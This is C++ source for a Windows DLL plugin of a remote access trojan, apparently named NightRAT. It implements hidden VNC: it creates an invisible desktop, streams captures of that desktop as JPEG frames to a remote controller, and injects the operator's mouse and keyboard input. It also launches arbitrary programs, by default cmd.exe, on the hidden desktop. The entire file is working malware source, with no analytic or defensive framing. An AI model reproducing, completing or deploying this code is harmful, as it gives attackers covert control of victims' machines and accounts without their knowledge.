#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <condition_variable>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 0x00000002
#endif

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HVNCFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t FRAME_FORMAT_JPEG = 1;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_socket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 20;

static HDESK g_hHiddenDesktop = NULL;
static wstring g_desktopName = L"NightRAT_HiddenDesktop";

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// Input Worker
struct InputTask {
    string action;
    json cmd;
};
static queue<InputTask> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCV;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    const char* ptr = serialized.c_str();
    int remaining = (int)serialized.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static void send_status(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json status;
    status["action"] = "hvnc_status";
    status["message"] = msg;
    safe_send_json(g_socket, status);
}

static void send_error(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json err;
    err["action"] = "hvnc_error";
    err["message"] = msg;
    safe_send_json(g_socket, err);
}

static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height, const vector<unsigned char>& jpegBytes) {
    if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;

    HVNCFrameHeader frameHeader{};
    frameHeader.monitor = 0;
    frameHeader.scale = (uint32_t)scale;
    frameHeader.fps = (uint32_t)fps;
    frameHeader.width = (uint32_t)width;
    frameHeader.height = (uint32_t)height;
    frameHeader.format = FRAME_FORMAT_JPEG;
    frameHeader.dataSize = (uint32_t)jpegBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_HVNC_FRAME;
    packetHeader.size = (uint32_t)(sizeof(HVNCFrameHeader) + jpegBytes.size());

    vector<unsigned char> packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(packet.data(), &packetHeader, sizeof(PacketHeader));
    memcpy(packet.data() + sizeof(PacketHeader), &frameHeader, sizeof(HVNCFrameHeader));
    memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    const char* ptr = (const char*)packet.data();
    int remaining = (int)packet.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& bytes) {
    if (!ensure_gdiplus()) return false;
    CLSID clsid;
    if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;
    Bitmap bmp(hBmp, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;
    EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;
    if (bmp.Save(stream, &clsid, &params) != Ok) { stream->Release(); return false; }
    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    LARGE_INTEGER li = {0};
    stream->Seek(li, STREAM_SEEK_SET, NULL);
    ULONG read;
    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
    stream->Release();
    return true;
}

static void ensure_desktop() {
    if (g_hHiddenDesktop) return;
    g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
    }
    if (!g_hHiddenDesktop) {
        send_error("Failed to create/open hidden desktop");
    }
}

// Window compositing helper
struct WindowInfo {
    HWND hwnd;
    RECT rect;
};

static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    vector<WindowInfo>* windows = (vector<WindowInfo>*)lParam;
    RECT rect;
    if (GetWindowRect(hwnd, &rect)) {
        windows->push_back({hwnd, rect});
    }
    return TRUE;
}

static void capture_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) {
        g_captureRunning = false;
        return;
    }

    if (!SetThreadDesktop(g_hHiddenDesktop)) {
        send_error("Failed to attach capture thread to hidden desktop");
        g_captureRunning = false;
        return;
    }

    send_status("Window compositing capture started");
    while (g_captureRunning) {
        DWORD start = GetTickCount();
        int scale, fps;
        SOCKET s;
        {
            lock_guard<mutex> lock(g_captureMutex);
            scale = g_scalePercent;
            fps = g_targetFps;
            s = g_socket;
        }

        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        // Final Frame Bitmap
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
        HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);

        // Background
        RECT fullRect = {0, 0, sw, sh};
        HBRUSH hBrushBg = CreateSolidBrush(RGB(45, 45, 45)); // Modern dark grey
        FillRect(hdcMem, &fullRect, hBrushBg);
        DeleteObject(hBrushBg);

        // Enum windows and draw them bottom to top
        vector<WindowInfo> windows;
        EnumDesktopWindows(g_hHiddenDesktop, EnumWindowsProc, (LPARAM)&windows);
        reverse(windows.begin(), windows.end()); // Bottom-to-top order

        for (const auto& win : windows) {
            int ww = win.rect.right - win.rect.left;
            int wh = win.rect.bottom - win.rect.top;
            if (ww <= 0 || wh <= 0) continue;

            HDC hdcWin = CreateCompatibleDC(hdcScreen);
            HBITMAP hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
            HGDIOBJ hOldWin = SelectObject(hdcWin, hbmpWin);

            // Capture window content
            if (PrintWindow(win.hwnd, hdcWin, PW_RENDERFULLCONTENT)) {
                BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
            } else {
                // Fallback for windows that don't support PrintWindow well
                HDC hdcRealWin = GetDC(win.hwnd);
                if (hdcRealWin) {
                    BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
                    ReleaseDC(win.hwnd, hdcRealWin);
                }
            }

            SelectObject(hdcWin, hOldWin);
            DeleteObject(hbmpWin);
            DeleteDC(hdcWin);
        }

        // Scale to final size
        int dw = (sw * scale) / 100;
        int dh = (sh * scale) / 100;
        if (dw < 1) dw = 1; if (dh < 1) dh = 1;

        HDC hdcFinal = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmpFinal = CreateCompatibleBitmap(hdcScreen, dw, dh);
        HGDIOBJ hOldFinal = SelectObject(hdcFinal, hbmpFinal);

        SetStretchBltMode(hdcFinal, HALFTONE);
        StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);

        vector<unsigned char> jpeg;
        if (bitmap_to_jpeg(hbmpFinal, 50, jpeg)) {
            if (!safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg)) {
                g_captureRunning = false;
            }
        }

        // Cleanup
        SelectObject(hdcFinal, hOldFinal);
        DeleteObject(hbmpFinal);
        DeleteDC(hdcFinal);

        SelectObject(hdcMem, hOldMem);
        DeleteObject(hbmpMem);
        DeleteDC(hdcMem);

        ReleaseDC(NULL, hdcScreen);

        DWORD elapsed = GetTickCount() - start;
        DWORD interval = 1000 / (fps > 0 ? fps : 1);
        if (elapsed < interval) Sleep(interval - elapsed);
    }
    send_status("Capture stopped");
}

static void input_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) {
        g_inputRunning = false;
        return;
    }

    if (!SetThreadDesktop(g_hHiddenDesktop)) {
        g_inputRunning = false;
        return;
    }

    while (g_inputRunning) {
        InputTask task;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
            if (!g_inputRunning && g_inputQueue.empty()) break;
            task = g_inputQueue.front();
            g_inputQueue.pop();
        }

        if (task.action == "hvnc_mousemove") {
            SetCursorPos(task.cmd.value("x", 0), task.cmd.value("y", 0));
        } else if (task.action == "hvnc_mousedown" || task.action == "hvnc_mouseup") {
            int x = task.cmd.value("x", 0), y = task.cmd.value("y", 0), btn = task.cmd.value("button", 0);
            DWORD flags = 0;
            if (task.action == "hvnc_mousedown") {
                flags = (btn == 0) ? MOUSEEVENTF_LEFTDOWN : (btn == 1 ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_MIDDLEDOWN);
            } else {
                flags = (btn == 0) ? MOUSEEVENTF_LEFTUP : (btn == 1 ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_MIDDLEUP);
            }
            mouse_event(flags, x, y, 0, 0);
        } else if (task.action == "hvnc_keydown" || task.action == "hvnc_keyup") {
            keybd_event((BYTE)task.cmd.value("keycode", 0), 0, (task.action == "hvnc_keyup" ? KEYEVENTF_KEYUP : 0), 0);
        }
    }
}

static wstring utf8_to_wstring(const string& str) {
    if (str.empty()) return wstring();
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (size <= 0) return wstring();
    wstring res(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
    if (res.back() == L'\0') res.pop_back();
    return res;
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    g_socket = sock;
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json cmd = json::parse(cmdJson);
        string action = cmd.value("action", "");
        g_socket = sock;

        if (action == "hvnc_start") {
            g_scalePercent = cmd.value("quality", 50);
            if (!g_captureRunning.exchange(true)) {
                if (g_captureThread.joinable()) g_captureThread.join();
                g_captureThread = thread(capture_loop);
            }
            if (!g_inputRunning.exchange(true)) {
                if (g_inputThread.joinable()) g_inputThread.join();
                g_inputThread = thread(input_loop);
            }
        } else if (action == "hvnc_stop") {
            g_captureRunning = false;
            g_inputRunning = false;
            g_inputCV.notify_all();
            if (g_captureThread.joinable()) g_captureThread.join();
            if (g_inputThread.joinable()) g_inputThread.join();
        } else if (action == "hvnc_quality") {
            lock_guard<mutex> lock(g_captureMutex);
            g_scalePercent = cmd.value("quality", 50);
        } else if (action == "hvnc_run") {
            ensure_desktop();
            if (!g_hHiddenDesktop) return;

            wstring wpath = utf8_to_wstring(cmd.value("path", "cmd.exe"));
            vector<wchar_t> pathBuffer(wpath.begin(), wpath.end());
            pathBuffer.push_back(L'\0');

            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;

            STARTUPINFOW si = { sizeof(si) };
            si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
            PROCESS_INFORMATION pi = { 0 };
            if (CreateProcessW(NULL, pathBuffer.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                send_status("Process started on: " + string(fullDesktopName.begin(), fullDesktopName.end()));
            } else {
                send_error("Failed to start process. Error: " + to_string(GetLastError()));
            }
        } else if (action.find("hvnc_mouse") != string::npos || action.find("hvnc_key") != string::npos) {
            lock_guard<mutex> lock(g_inputMutex);
            g_inputQueue.push({action, cmd});
            g_inputCV.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning = false;
        g_inputRunning = false;
        g_inputCV.notify_all();
    }
    return TRUE;
}
